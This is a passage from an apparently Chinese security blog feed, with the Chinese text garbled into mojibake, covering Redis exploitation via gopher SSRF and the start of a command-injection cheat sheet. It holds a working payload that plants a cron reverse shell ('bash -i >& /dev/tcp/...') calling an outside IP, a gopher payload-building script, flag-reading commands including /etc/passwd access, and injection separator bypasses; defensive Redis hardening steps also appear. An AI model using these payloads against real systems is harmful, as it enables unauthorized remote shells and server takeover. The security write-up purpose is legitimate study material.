class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp += <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp += line</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp += <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp += line</span><br><span class="line">print(<span class="string">'_'</span> + exp)  <span class="comment"># ç›´æ¥åŠ å…¥ _</span></span><br></pre></td></tr></table></figure><p>å°†ä¹‹å‰ <code>socat</code> å‘½ä»¤è¾“å‡ºçš„æ•°æ®æµå­˜ä¸º <code>data.txt</code>ï¼Œç„¶åè¿›è¡Œè½¬æ¢</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  tmp py3 gopher.py data.txt</span><br><span class="line">_*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">66</span>%<span class="number">0</span>d%<span class="number">0</span>a-e %<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">47.11</span><span class="number">.220</span><span class="number">.241</span>/<span class="number">9669</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ curl å‘é€ payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 'gopher://victim_ip:port/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$66%0d%0a-e %0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.11.220.241/9669 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦æ¢ IP å’Œç«¯å£ï¼Œå‰é¢çš„<code>$58</code>ä¹Ÿéœ€è¦æ›´æ”¹ï¼Œ<code>$58</code>è¡¨ç¤ºå­—ç¬¦ä¸²é•¿åº¦ä¸º 58 ä¸ªå­—èŠ‚ï¼Œä¸Šé¢çš„ EXP å³æ˜¯<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a</code>ï¼Œ3+51+4=58ã€‚å¦‚æœæƒ³æ¢æˆ 42.256.24.73ï¼Œé‚£ä¹ˆ $58 éœ€è¦æ”¹æˆâ€‹ $61ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><h2 id="é˜²å¾¡å»ºè®®"><a href="#é˜²å¾¡å»ºè®®" class="headerlink" title="é˜²å¾¡å»ºè®®"></a>é˜²å¾¡å»ºè®®</h2><h3 id="ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"><a href="#ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰" class="headerlink" title="ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"></a>ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</h3><ul><li>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">""</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">""</span></span><br><span class="line">rename-command EVAL <span class="string">""</span></span><br></pre></td></tr></table></figure><ul><li>æˆ–è€…é€šè¿‡ä¿®æ”¹redis.confæ–‡ä»¶ï¼Œæ”¹å˜è¿™äº›é«˜å±å‘½ä»¤çš„åç§°</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">"name1"</span></span><br><span class="line">rename-command<span class="built_in"> CONFIG </span><span class="string">"name2"</span></span><br><span class="line">rename-command EVAL <span class="string">"name3"</span></span><br></pre></td></tr></table></figure><h3 id="ä»¥ä½æƒé™è¿è¡Œ-Redis-æœåŠ¡ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"><a href="#ä»¥ä½æƒé™è¿è¡Œ-Redis-æœåŠ¡ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰" class="headerlink" title="ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"></a>ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</h3><p>ä¸º Redis æœåŠ¡åˆ›å»ºå•ç‹¬çš„ç”¨æˆ·å’Œå®¶ç›®å½•ï¼Œå¹¶ä¸”é…ç½®ç¦æ­¢ç™»é™†</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis <span class="meta">&amp;&amp; useradd -r -g redis redis</span></span><br></pre></td></tr></table></figure><h3 id="ä¸º-Redis-æ·»åŠ å¯†ç éªŒè¯ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"><a href="#ä¸º-Redis-æ·»åŠ å¯†ç éªŒè¯ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰" class="headerlink" title="ä¸º Redis æ·»åŠ å¯†ç éªŒè¯ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"></a>ä¸º Redis æ·»åŠ å¯†ç éªŒè¯ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</h3><p>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">requirepass mypassword</span></span><br></pre></td></tr></table></figure><p>ï¼ˆæ³¨æ„redisä¸è¦ç”¨-aå‚æ•°ï¼Œæ˜æ–‡è¾“å…¥å¯†ç ï¼Œè¿æ¥åä½¿ç”¨authè®¤è¯ï¼‰</p><h3 id="ç¦æ­¢å¤–ç½‘è®¿é—®-Redisï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"><a href="#ç¦æ­¢å¤–ç½‘è®¿é—®-Redisï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰" class="headerlink" title="ç¦æ­¢å¤–ç½‘è®¿é—® Redisï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰"></a>ç¦æ­¢å¤–ç½‘è®¿é—® Redisï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</h3><p>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ï¼Œä½¿å¾— Redis æœåŠ¡åªåœ¨å½“å‰ä¸»æœºå¯ç”¨</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bind</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br></pre></td></tr></table></figure><p>åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™</p><h3 id="ä¿®æ”¹é»˜è®¤ç«¯å£"><a href="#ä¿®æ”¹é»˜è®¤ç«¯å£" class="headerlink" title="ä¿®æ”¹é»˜è®¤ç«¯å£"></a>ä¿®æ”¹é»˜è®¤ç«¯å£</h3><p>ä¿®æ”¹é…ç½®æ–‡ä»¶redis.confæ–‡ä»¶</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Port <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>é»˜è®¤ç«¯å£æ˜¯6379ï¼Œå¯ä»¥æ”¹å˜æˆå…¶ä»–ç«¯å£ï¼ˆä¸è¦å†²çªå°±å¥½ï¼‰</p><h3 id="ä¿è¯-authorized-keys-æ–‡ä»¶çš„å®‰å…¨"><a href="#ä¿è¯-authorized-keys-æ–‡ä»¶çš„å®‰å…¨" class="headerlink" title="ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨"></a>ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</h3><p>ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œæ‚¨åº”è¯¥é˜»æ­¢å…¶ä»–ç”¨æˆ·æ·»åŠ æ–°çš„å…¬é’¥ã€‚</p><ul><li>å°† authorized_keys çš„æƒé™è®¾ç½®ä¸ºå¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ²¡æœ‰ä»»ä½•æƒé™ï¼š</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">400</span> ~<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure><ul><li>ä¸ºä¿è¯ authorized_keys çš„æƒé™ä¸ä¼šè¢«æ”¹æ‰ï¼Œæ‚¨è¿˜éœ€è¦è®¾ç½®è¯¥æ–‡ä»¶çš„ immutable ä½æƒé™:</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><ul><li>ç„¶è€Œï¼Œç”¨æˆ·è¿˜å¯ä»¥é‡å‘½å ~/.sshï¼Œç„¶åæ–°å»ºæ–°çš„ ~/.ssh ç›®å½•å’Œ authorized_keys æ–‡ä»¶ã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œéœ€è¦è®¾ç½® ~./ssh çš„ immutable æƒé™ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +<span class="selector-tag">i</span> ~/.ssh</span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®é˜²ç«å¢™ç­–ç•¥"><a href="#è®¾ç½®é˜²ç«å¢™ç­–ç•¥" class="headerlink" title="è®¾ç½®é˜²ç«å¢™ç­–ç•¥"></a>è®¾ç½®é˜²ç«å¢™ç­–ç•¥</h3><p>å¦‚æœæ­£å¸¸ä¸šåŠ¡ä¸­RedisæœåŠ¡éœ€è¦è¢«å…¶ä»–æœåŠ¡å™¨æ¥è®¿é—®ï¼Œå¯ä»¥è®¾ç½®iptablesç­–ç•¥ä»…å…è®¸æŒ‡å®šçš„IPæ¥è®¿é—®RedisæœåŠ¡ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p><p><a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></p><p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">https://www.freebuf.com/column/158065.html</a></p><p><a href="https://xz.aliyun.com/t/2295" target="_blank" rel="noopener">https://xz.aliyun.com/t/2295</a></p><p><a href="https://www.k0rz3n.com/2018/11/08/Redis%20åŸºç¡€æ¢³ç†ä»¥åŠå…¶åœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/08/Redis%20åŸºç¡€æ¢³ç†ä»¥åŠå…¶åœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨</a></p><p><a href="https://www.smi1e.top/gopher-ssrfæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrfæ”»å‡»å†…ç½‘åº”ç”¨å¤ç°/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redis-ä»‹ç»&quot;&gt;&lt;a href=&quot;#Redis-ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Redis ä»‹ç»&quot;&gt;&lt;/a&gt;Redis ä»‹ç»&lt;/h2&gt;&lt;h3 id=&quot;æ˜¯ä»€ä¹ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#æ˜¯ä»€ä¹ˆï¼Ÿ&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="redis" scheme="https://wywwzjj.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ³¨å…¥æ€»ç»“</title>
    <link href="https://wywwzjj.top/2019/05/12/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://wywwzjj.top/2019/05/12/å‘½ä»¤æ³¨å…¥æ€»ç»“/</id>
    <published>2019-05-11T16:49:43.000Z</published>
    <updated>2019-05-21T02:05:59.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç›´æ¥æ‰§è¡Œä»£ç "><a href="#ç›´æ¥æ‰§è¡Œä»£ç " class="headerlink" title="ç›´æ¥æ‰§è¡Œä»£ç "></a>ç›´æ¥æ‰§è¡Œä»£ç </h2><p>PHP ä¸­æœ‰ä¸å°‘å¯ä»¥ç›´æ¥æ‰§è¡Œä»£ç çš„å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>();</span><br><span class="line">assert();</span><br><span class="line">system();</span><br><span class="line">exec();</span><br><span class="line">shell_exec();</span><br><span class="line">passthru();</span><br><span class="line">escapeshellcmd();</span><br><span class="line">pcntl_exec();</span><br></pre></td></tr></table></figure><p>preg_replace( ) ä»£ç æ‰§è¡Œ</p><p>preg_replace() çš„ç¬¬ä¸€ä¸ªå‚æ•°å¦‚æœå­˜åœ¨ <code>/e</code> æ¨¡å¼ä¿®é¥°ç¬¦ï¼Œåˆ™å…è®¸ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = <span class="string">"&lt;tag&gt;phpinfo()&lt;/tag&gt;"</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e"</span>, <span class="string">"addslashes(\\1)"</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‹¥æ—  <code>/e</code> ä¿®é¥°ç¬¦ï¼Œåˆ™å¯ä»¥å°è¯• %00 æˆªæ–­ã€‚</p><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><ul><li><p>cmd &gt; file<br>  æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ã€‚å¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºåŸæœ‰æ–‡ä»¶ï¼Œä½¿ç”¨bashçš„noclobberé€‰é¡¹å¯ä»¥é˜²æ­¢å¤ç›–åŸæœ‰æ–‡ä»¶ã€‚</p></li><li><p>cmd &gt;&gt; file<br>  æŠŠcmdå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶fileä¸­ï¼Œå¦‚æœfileå·²ç»å­˜åœ¨ï¼Œåˆ™æŠŠä¿¡æ¯åŠ åœ¨åŸæœ‰æ–‡ä»¶åé¢ã€‚</p></li><li><p>cmd &lt; file<br>  ä½¿cmdå‘½ä»¤ä»fileè¯»å…¥</p></li><li><p>cmd &lt;&lt; text<br>  ä»å‘½ä»¤è¡Œè¯»å–è¾“å…¥ï¼Œç›´åˆ°ä¸€ä¸ªä¸textç›¸åŒçš„è¡Œç»“æŸã€‚é™¤éä½¿ç”¨å¼•å·æŠŠè¾“å…¥æ‹¬èµ·æ¥ï¼Œæ­¤æ¨¡å¼å°†å¯¹è¾“å…¥å†…å®¹è¿›è¡Œshellå˜é‡æ›¿æ¢ã€‚å¦‚æœä½¿ç”¨<code>&lt;&lt;-</code> ï¼Œåˆ™ä¼šå¿½ç•¥æ¥ä¸‹æ¥è¾“å…¥è¡Œé¦–çš„tabï¼Œç»“æŸè¡Œä¹Ÿå¯ä»¥æ˜¯ä¸€å †tabå†åŠ ä¸Šä¸€ä¸ªä¸textç›¸åŒçš„å†…å®¹ï¼Œå¯ä»¥å‚è€ƒå¾Œé¢çš„ä¾‹å­ã€‚</p></li><li><p>cmd &lt;&lt;&lt; word<br>  æŠŠwordï¼ˆè€Œä¸æ˜¯æ–‡ä»¶wordï¼‰å’Œåé¢çš„æ¢è¡Œä½œä¸ºè¾“å…¥æä¾›ç»™cmdã€‚</p></li><li><p>cmd &lt;&gt; file<br>  ä»¥è¯»å†™æ¨¡å¼æŠŠæ–‡ä»¶fileé‡å®šå‘åˆ°è¾“å…¥ï¼Œæ–‡ä»¶fileä¸ä¼šè¢«ç ´åã€‚ä»…å½“åº”ç”¨ç¨‹åºåˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§æ—¶ï¼Œå®ƒæ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p></li><li><p>cmd &gt;| file<br>  åŠŸèƒ½åŒ&gt;ï¼Œä½†å³ä¾¿åœ¨è®¾ç½®äº†noclobberæ—¶ä¹Ÿä¼šå¤ç›–fileæ–‡ä»¶ï¼Œæ³¨æ„ç”¨çš„æ˜¯|è€Œéä¸€äº›ä¹¦ä¸­è¯´çš„!ï¼Œç›®å‰ä»…åœ¨cshä¸­ä»æ²¿ç”¨<code>&gt;!</code>å®ç°è¿™ä¸€åŠŸèƒ½ã€‚</p></li><li><p>: &gt; filename</p><p>  æŠŠæ–‡ä»¶<code>filename</code>æˆªæ–­ä¸º0é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, é‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ª0é•¿åº¦çš„æ–‡ä»¶(ä¸<code>touch</code>çš„æ•ˆæœç›¸åŒ).</p></li><li><p>cmd &gt;&amp;n</p><p>  æŠŠè¾“å‡ºé€åˆ°æ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd m&gt;&amp;n</p><p>  æŠŠè¾“å‡ºåˆ°æ–‡ä»¶ç¬¦mçš„ä¿¡æ¯é‡å®šå‘åˆ°æ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd &gt;&amp;-</p><p>  å…³é—­æ ‡å‡†è¾“å‡º</p></li><li><p>cmd &lt;&amp;n</p><p>  è¾“å…¥æ¥è‡ªæ–‡ä»¶æè¿°ç¬¦n</p></li><li><p>cmd m&lt;&amp;n</p><p>  mæ¥è‡ªæ–‡ä»¶æè¿°å„ä¸ªn</p></li><li><p>cmd &lt;&amp;-</p><p>  å…³é—­æ ‡å‡†è¾“å…¥</p></li><li><p>cmd &lt;&amp;n-</p><p>  ç§»åŠ¨è¾“å…¥æ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚</p></li><li><p>cmd &gt;&amp;n-</p><p>  ç§»åŠ¨è¾“å‡ºæ–‡ä»¶æè¿°ç¬¦nè€Œéå¤åˆ¶å®ƒã€‚<br>  æ³¨æ„ï¼š <code>&gt;&amp;</code>å®é™…ä¸Šå¤åˆ¶äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™ä½¿å¾—<code>cmd &gt; file 2&gt;&amp;1</code>ä¸<code>cmd 2&gt;&amp;1 &gt;file</code>çš„æ•ˆæœä¸ä¸€æ ·ã€‚</p></li></ul><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">flag</span> /&#123;cat,<span class="built_in">flag</span>&#125;</span><br><span class="line">more <span class="built_in">flag</span></span><br><span class="line">less <span class="built_in">flag</span></span><br><span class="line">bzmore <span class="built_in">flag</span></span><br><span class="line">bzless <span class="built_in">flag</span></span><br><span class="line">head <span class="built_in">flag</span></span><br><span class="line">tail <span class="built_in">flag</span></span><br><span class="line">tailf <span class="built_in">flag</span> </span><br><span class="line">tac <span class="built_in">flag</span></span><br><span class="line">nl <span class="built_in">flag</span></span><br><span class="line">od -a <span class="built_in">flag</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fire</span> <span class="built_in">flag</span></span><br><span class="line">wc <span class="built_in">flag</span></span><br><span class="line">uniq <span class="built_in">flag</span></span><br><span class="line">diff <span class="built_in">flag</span> flag1.txt</span><br><span class="line">sed -n <span class="string">'1,2p'</span> <span class="built_in">flag</span></span><br><span class="line"><span class="built_in">find</span> -P <span class="built_in">flag</span></span><br><span class="line">strings <span class="built_in">flag</span></span><br><span class="line">curl file:<span class="comment">///root/flag</span></span><br><span class="line"><span class="built_in">sort</span> <span class="built_in">flag</span></span><br><span class="line">bash -v <span class="built_in">flag</span> </span><br><span class="line">rev <span class="built_in">flag</span></span><br><span class="line">paste ./<span class="built_in">flag</span>.txt /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="å¤šæ¡å‘½ä»¤"><a href="#å¤šæ¡å‘½ä»¤" class="headerlink" title="å¤šæ¡å‘½ä»¤"></a>å¤šæ¡å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0aã€%0d    æ¢è¡Œç¬¦ä¸å›è½¦ç¬¦</span></span><br><span class="line">|           ç¬¬ä¸€æ¡å‘½ä»¤ç»“æœä½œä¸ºç¬¬äºŒæ¡å‘½ä»¤çš„è¾“å…¥</span><br><span class="line">||          ç¬¬ä¸€æ¡æ‰§è¡Œå¤±è´¥ï¼Œæ‰§è¡Œç¬¬äºŒæ¡å‘½ä»¤</span><br><span class="line">;           è¿ç»­æŒ‡ä»¤åŠŸèƒ½ã€‚</span><br><span class="line">&amp;           è¿æ¥çš„ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line">&amp;&amp;          å½“ç¬¬ä¸€æ¡æ‰§è¡ŒæˆåŠŸåæ‰§è¡Œåç»­å‘½ä»¤</span><br><span class="line"></span><br><span class="line">echo 666`date` =&gt; 666Tue 14 May 2019 07:15:23 AM EDT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows</span></span><br><span class="line">Copy %0a</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">1a - ä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦</span></span><br><span class="line">&lt;?php</span><br><span class="line">    $command = 'dir '.$_POST['dir'];</span><br><span class="line">    $escaped_command = 